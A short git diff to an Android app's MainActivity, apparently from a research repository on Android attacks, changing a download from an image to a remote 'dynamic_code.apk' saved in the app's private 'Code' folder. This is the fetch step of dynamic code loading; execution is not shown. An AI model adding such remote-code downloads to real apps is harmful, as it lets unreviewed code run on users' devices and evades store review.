@@ -82,7 +82,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void loadCode() {
         Log.i(TAG, "Downloading file...");
-        String URL = "https://github.com/manwelbugeja/android-attacks/raw/main/resources/test.jpg";
+        String URL = "https://github.com/manwelbugeja/android-attacks/blob/main/resources/dynamic_code.apk?raw=true";
         new DownloadFile().execute(URL);
     }
 
@@ -166,12 +166,12 @@ public class MainActivity extends AppCompatActivity {
 
             if (result != null) {
                 Log.i(TAG, "Result not null");
-                File dir = new File(getApplicationContext().getFilesDir(), "MyImages");
+                File dir = new File(getApplicationContext().getFilesDir(), "Code");
                 if(!dir.exists()){
                     Log.i(TAG, "Creating directory...");
                     dir.mkdir();
                 }
-                File destination = new File(dir, "code.txt");
+                File destination = new File(dir, "code.apk");
 
                 try {
                     destination.createNewFile();
